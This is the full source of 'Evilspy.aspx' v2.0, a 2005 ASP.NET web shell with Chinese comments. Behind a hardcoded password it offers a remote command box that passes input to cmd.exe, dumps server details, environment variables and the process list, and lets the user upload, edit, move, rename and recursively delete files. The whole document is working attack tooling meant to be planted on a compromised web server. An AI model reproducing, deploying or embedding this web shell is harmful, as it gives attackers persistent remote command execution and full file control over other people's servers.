<%@page Language="VB" Debug="true" trace="false" validateRequest="false" %>
<%@ import namespace="System.IO"%>
<%@ import namespace="System.Net"%>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
'------------------------------------
'SoftWare:Evilspy.aspx
'version:2.0 Build 20050824
'coder:dream2fly[EST]
'QQ:78623269
'site:http://dream2fly.net
'运行环境：asp.net
'发布时间：2005-08-24
'note:请不要用于非法用途,发现bug请指正。
'登陆密码:evilspy
'版本控制：
'ver 1.0 2005-05-27 基本功能：探针,Net.Cmd
'ver 1.5 2005-08-20 新增文件编辑
'ver 1.7 2005-08-23 新增文件上传、删除,优化出错显示
'ver 2.0 2005-08-24 新增文件移动、拷贝、重命名,修正几个bug
'------------------------------------

private PassWord as string="314502" '这是登陆密码。
dim url as string
dim xdir  as directoryinfo
dim xfile as fileinfo
dim mydir as directoryInfo

Sub Page_Load(Src as object, E as EventArgs)
	if request.QueryString("src")<>"" then
		url=request.QueryString("src")
	else
		url=server.MapPath(".") & "\"
	end if
	if session("evilspy")<>"swords" then
		call login()
	else
		Dim ex as Exception
		Try
			dim action as string=request.params("act")
			select case action
				case "info"
					call info()
				case "cmdshell"
					call cmdshell()
				case "loginout"
					call loginout()
				case "filemanage"
					call filemanage()
				case "edit"
					call edit()
				case "del"
					call del()
				case "rename"
					call rename()
			end select
		Catch ex
			lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
		End Try
	end if
end sub

sub login()
	panel01.visible="true"
	panel02.visible="false"
	panel03.visible="false"
end sub

sub loginout()
	session.abandon()
	panel01.visible="true"
end sub

sub filemanage()
	url=request.params("src")
	if url="" then
		url=server.mappath(".") & "\"
	end if
	panel02.visible="true"
	dir.value=url
	lblpath.text="当前目录："& url
end sub

sub edit()
	panel03.visible="true"
	if tbcontents.text="" then
		tbfile.text=request.QueryString("src")
		dim objreader as new streamreader(tbfile.text,encoding.default)
		tbcontents.text=objreader.readtoend
		objreader.close
	end if
end sub

sub writefile(Src As Object, E As EventArgs)
	dim objwriter as streamwriter
	if file.exists(tbfile.text) then
	objwriter=new streamwriter(tbfile.text,false,encoding.default)
	objwriter.write(tbcontents.text)
	objwriter.close
	end if
end sub

sub runlogin(Src As Object, E As EventArgs)
	if tbpmd.text=PassWord then 
		session("evilspy")="swords"
		session.Timeout=3600 'one hour
		call filemanage()
		panel01.visible="false"
		lblerror.text=""
	else
		lblerror.text="<font color='red'>密码错误！</font><br>"
	end if
end sub

sub info()
	lblinfo.text+=("<em>客户端IP:</em>" & request.ServerVariables("REMOTE_ADDR") & "<br>")
	lblinfo.text+=("<em>客户端浏览器:</em>" & request.ServerVariables("HTTP_USER_AGENT") & "<br>")
	lblinfo.text+=("<em>服务器版本:</em> " & Environment.OSVersion.tostring() & "<br>")
	lblinfo.text+=("<em>IIS版本:</em>" & request.ServerVariables("SERVER_SOFTWARE") & "<br>")
	lblinfo.text+=("<em>服务器名:</em> "  &Environment.MachineName &"<br>")
	lblinfo.text+=("<em>服务器IP: </em>")
	Dim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList 
	Dim i As Integer 
	For i = 0 To addressList.Length - 1 
		lblinfo.text+= addressList(i).ToString() & "<br>"
	Next i 
	lblinfo.text+=("<em>服务器运行时间:</em> "  &Environment.TickCount/1000/60/60 &"小时<br>")
	lblinfo.text+=("<em>UserDomainName:</em> "  &Environment.UserDomainName &"<br>")
	lblinfo.text+=("<em>WorkingSet:</em> "  &Environment.WorkingSet &"<br>")
	lblinfo.text+=("<em>UserName:</em> "  &Environment.UserName &"<br>")
	lblinfo.text+=("<em>UserInteractive:</em> "  &Environment.UserInteractive &"<br>")
	lblinfo.text+=("<em>逻辑盘  :</em> ")  
	Dim drives As [String]()= Environment.GetLogicalDrives()
    Dim d As string
    For Each d In drives
         	lblinfo.text+="<em> " & d & " </em>"
	next d

	lblinfo.text+=("<p><em>环境变量  :</em>")
	lblinfo.text+ = "<br>----------------------------------------------<br>"
    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
	Dim de As DictionaryEntry
    For Each de In environmentVariables
         	lblinfo.text+="<em>" & de.Key & ":</em>" & de.Value & "<br>"
	next de
	lblinfo.text+ = "<br>----------------------------------------------<br>"
	lblinfo.text+ ="<p><em>当前进程：</em>"
	lblinfo.text+ = "<br>----------------------------------------------<br>"
	Dim p As Process 
	For Each p In Process.GetProcesses() 
		lblinfo.text+ = p.ToString() & "<br>"
	Next p 
	lblinfo.text+ = "<br>----------------------------------------------<br>"

end sub

sub cmdshell()
	panel0.visible="true"
end sub

Sub runcmd(Src As Object, E As EventArgs)
	Dim ex as Exception
	try
		dim psi As New ProcessStartInfo("cmd.exe")
		psi.UseShellExecute = False
		psi.RedirectStandardOutput = true
		
		dim pro as new process()
		pro.startinfo=psi
		pro.startinfo.arguments="/c " & tbcmd.text
		pro.start()
		
		dim objreader as streamreader=pro.standardoutput
		lblcmd.text="<pre>" & objreader.readtoend & "</pre>"
		objreader.close()
		pro.close()
	Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
End Sub

Sub UploadFile_Clicked ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
　　	Dim lstrFileName as string 
　　	Dim lstrFileNamePath as string 
　　	Dim lstrFileFolder as string 
		
　　	if dir.value <> "" then 
　　　	lstrFileFolder = dir.value 
　　	else 
　　　	lstrFileFolder = url 
　　	end if 

　　	' 获得文件名称 
　　	lstrFileName = loFile.PostedFile.FileName
　　　	' 注： loFile.PostedFile.FileName 返回的是
　　　	' 通过文件对话框选择的文件名，这之中包含了文件的目录信息
　　	lstrFileName = Path.GetFileName ( lstrFileName ) 
　　　	' 去掉目录信息，返回文件名称

　　	' 判断上传目录是否存在，不存在就建立 
　　	If ( not Directory.Exists ( lstrFileFolder ) ) Then 
　　　	Directory.CreateDirectory ( lstrFileFolder ) 
　　	End If 

　　　	'上传文件到服务器 
　　	lstrFileNamePath = lstrFileFolder & lstrFileName 
　　　	' 得到上传目录及文件名称 
　　	loFile.PostedFile.SaveAs ( lstrFileNamePath ) 

　　　	' 获得并显示上传文件的属性 
　　	FileName.Text = lstrFileName
　　　	' 获得文件名称
　　	FileType.Text = loFile.PostedFile.ContentType 
　　　	' 获得文件类型
　　	FileLength.Text = cStr ( loFile.PostedFile.ContentLength ) 
　　　	' 获得文件长度
　　	panel02.visible = false 
　　	panel04.visible = true
　　　	' 显示上传文件属性
　　Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
End sub  


sub del()
	dim temp as string
	temp=request.QueryString("src")
	call delfile(temp)  
	lblerror.text="删除文件 " & temp & " 成功！"
end sub

sub delfile(temp)
	Dim ex as Exception
	try
		if right(temp,1)="\" then
			dim xdir as directoryinfo
			dim mydir as new DirectoryInfo(temp)
			dim xfile as fileinfo
			for each xfile in mydir.getfiles()
				file.delete(temp & xfile.name)
			next
			for each xdir in mydir.getdirectories()
				call delfile(temp & xdir.name & "\")
			next
			directory.delete(temp)
		else
			file.delete(temp)
		end if
	Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
End Sub

Sub movefile ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		lblpath.text= srcfile.text & "->" & desfile.text & "文件的移动工作已经成功完成！"
		File.move( srcfile.text , desfile.text ) 
	Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
End sub 

Sub copyfile ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		File.copy( srcfile.text , desfile.text ) 
	Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
End sub   

sub rename()
	url=request.QueryString("src")
	panel05.visible="true"
end sub

sub rename_clicked( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		mydir=new directoryinfo(url)
		file.copy(url,mydir.parent.fullname & newfilename.text)
		call delfile(url)  
		lblpath.text="重命名 " & replace(url,"\","\\") & " 成功！"
	Catch ex
		lblerror.Text =("<font color=""red"">出现异常：</font>" & ex.Message)
	End Try
end sub
</script>

<html><head>
<meta http-equiv="Content-Type" content="text/html" charset=gb2312>
<title>Evilspy.aspx by 菠菜系统分析实验室 http://angler.126.com</title>
<style type="text/css">
A
{
	font-family: verdana, arial, Geneva, Helvetica, sans-serif;
	color: #FAFC72;
	text-decoration: none;
}

A:hover
{
	text-decoration: underline;
}

TD
{
	font-family: verdana, arial, Geneva, Helvetica, sans-serif;
	font-size: 9pt;
	color: #FFFFFF;
}

.btn
{
	color: #FAFC72;
	background-color: #000000;
}

html, body
{
	margin:0;
	padding:0;
	color: #FAFC72;
	background-color: #000000;
}
</style>
<script language="javascript">
function del()
{
if(confirm("确定删除吗？")){return true;}
else{return false;}
}
</script>
</head><body>
<div style="padding:15,15,15,15;font-size:10pt;font-family:verdana"; 
border-width:2px 2px 2px 2px; border-style:solid; border-color:black;">
<p align='center'>Evilspy.aspx v2.0</p>
<center>[<a href="?act=info">系统参数</a>] | [<a href="?act=cmdshell">Net.Cmd</a>]| [<a href="?act=filemanage">文件管理</a>] | [<a href="javascript:history.back(1);">返回</a>] | [<a href="?act=loginout">退出</a>]</center>
<hr width="90%">

<form method = "post" enctype = "multipart/form-data" runat = "server">

<table width="80%"  border="0" align="center">
<asp:label id="lblinfo"  runat="server"  maintainstate="false"/><p>
<asp:label id="lblerror"  runat="server"  maintainstate="false"/><p>
</table>

<asp:panel id="Panel0" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
<asp:textbox id="tbcmd"  width="30%" runat="server"/>
<asp:button id="btcmd" text="runcmd" class="btn" onclick="runcmd" runat="server"/></center><br>
<asp:label id="lblcmd" runat="server"/>
</table>
</asp:panel>

<asp:panel id="panel01" runat="server"  visible="false">
<center><asp:textbox id="tbpmd" textmode="password" runat="server"/>
<asp:button id="btlogin" text="Login" class="btn" onclick="runlogin" runat="server"/></center>
</asp:panel>

<asp:panel id="panel02" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
<asp:label id="lblpath" runat="server"/>
	<tr>文件上传：<br>	
　选择文件：<input id = "loFile" type = "file" runat = "server" > <br >
　上传目录：<input id = "dir" type = "text" runat = "server" >
　<input type = "submit" class="btn" value = "上传文件" OnServerClick = "UploadFile_Clicked" runat = "server" >
　<br >
	</tr>
	<hr>
	<tr>文件移动/拷贝：<br>
　源地址： <asp:textbox id="srcfile"  width="90%" runat="server" /><br >
　目的地址：<asp:textbox id="desfile"  width="90%" runat="server" /><br>
  <asp:button id="btmove" text="移动" class="btn"　OnServerClick = "moveFile" runat = "server"/>
　<asp:button id="btcopy" text="拷贝" class="btn"　OnServerClick = "copyFile" runat = "server"/>
　<br >
	</tr>
	<hr>
	<tr>
		<td width="15%"><strong>名称</strong></td>
		<td width="10%"><strong>大小(byte)</strong></td>
		<td width="10%"><strong>创建时间</strong></td>
		<td width="10%"><strong>修改时间</strong></td>
		<td width="10%"><strong>访问时间</strong></td>
		<td width="25%"><strong>操作</strong></td>
	</tr>
    <tr>
       <td>
		<%
		mydir=new directoryinfo(url)
		dim panel02info as string= "<tr><td><a href='?act=filemanage&src=" & server.urlencode(mydir.parent.fullname) &  "\'>父目录..</a></td></tr>"
		response.Write(panel02info)

		for each xdir in mydir.getdirectories
			response.Write("<tr>")
			dim filepath as string 
			filepath=server.UrlEncode(url & xdir.name)
			panel02info= "<td><a href='?act=filemanage&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
			response.Write(panel02info)
			response.Write("<td>&lt;dir&gt;</td>")
			
			response.Write("<td>" & Directory.GetCreationTime(url & xdir.name) & "</td>")
   			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
			response.Write("<td>" & Directory.GetlastAccessTime(url & xdir.name) & "</td>")

			panel02info="<td><a href='?act=del&src=" & filepath & "\'" & " onclick='return del(this);'>删除</a></td>"
			response.Write(panel02info)
			response.Write("</tr>")
		next
		%>
		</td>
	</tr>
	<tr>
        <td>
		<%
		for each xfile in mydir.getfiles()
			dim filepath2 as string
			filepath2=server.UrlEncode(url & xfile.name)
			response.Write("<tr>")
			panel02info="<td>" & xfile.name & "</td>"
			response.Write(panel02info)
			panel02info="<td>" & xfile.length & "</td>"
			response.Write(panel02info)

			response.Write("<td>" & File.GetCreationTime(url & xfile.name) & "</td>")
			response.Write("<td>" & File.GetLastWriteTime(url & xfile.name) & "</td>")
			response.Write("<td>" & File.GetlastAccessTime(url & xfile.name) & "</td>")	

			panel02info="<td><a href='?act=edit&src=" & filepath2 & "' target='_blank'>编辑</a>|<a href='?act=rename&src=" & filepath2 & "' target='_blank'>重命名</a>|<a href='?act=del&src=" & filepath2 & "' onClick='return del(this);'>删除</a></td>"
			response.Write(panel02info)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%>
		</td>
    </tr>
</table>
</asp:panel>

<asp:panel id="panel03" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
路径：<asp:textbox id="tbfile"  width="90%" runat="server" /><p>
内容：<asp:textbox id="tbcontents" runat="server" textmode="multiline" columns="80" rows="20" />
<p>
<asp:button id="btwrite" class="btn" runat="server" onclick="writefile" text="保存修改"/>
</table>
</asp:panel>
<ASP:panel id = "panel04" visible = " false " runat = "server">
<table width="80%"  border="0" align="center">
成功上传 <ASP:label id = "FileName" runat = "server" /> <br>
文件大小 <ASP:label id = "FileLength" runat = "server" /> bytes <br>
文件类型 <ASP:label id = "FileType" runat = "server" /> <br>
</table>
</ASP:panel>
<ASP:panel id = "panel05" visible = " false " runat = "server">
<table width="80%"  border="0" align="center">
新文件名: <ASP:textbox id = "newFileName" runat = "server" /> <br>
<asp:button id="btrename" class="btn" runat="server" onclick="rename_clicked" text="保存修改"/>
</table>
</ASP:panel>
</form>  
<hr width="90%">
<p align="center">Copyright &copy; 2005 <a href="http://angler.126.com" target="_blank">swords<em>[EST]</em> @ 菠菜系统分析实验室&trade;</a> All Rights Reserved. 
</p>
<p align="center">致谢：<a href="http://article.jayhome.org" target="_blank">"逆动火流"</a>提供开发测试空间！</p>
</div>
</body></html>